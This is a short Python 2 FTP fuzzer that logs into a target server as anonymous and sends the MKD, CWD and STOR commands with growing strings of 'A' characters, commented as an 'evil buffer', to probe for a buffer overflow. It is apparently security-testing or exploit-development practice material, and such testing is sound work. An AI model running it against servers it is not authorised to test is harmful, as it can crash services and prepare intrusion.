#! /usr/bin/python
import socket 
import os
import sys 

target = sys.argv[1] 
buffer = ["A"] #the given buffer 
counter = 20 #buffer counter 

while len(buffer) <= 100:
	buffer.append("A"*counter)
	counter = counter+20

commands = ["MKD","CWD","STOR"]

for command in commands:
	for string in buffer:
		print "Fuzzing " + command + ":" + str(len(string))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((target,21)) # hardcoded IP address
		s.recv(1024)
		s.send('USER ftp\r\n') # login procedure
		s.recv(1024)
		s.send('PASS ftp\r\n')
		s.recv(1024)
		s.send(command + ' ' + string + '\r\n') # evil buffer
		s.recv(1024)
		s.send('QUIT\r\n')
		s.close()


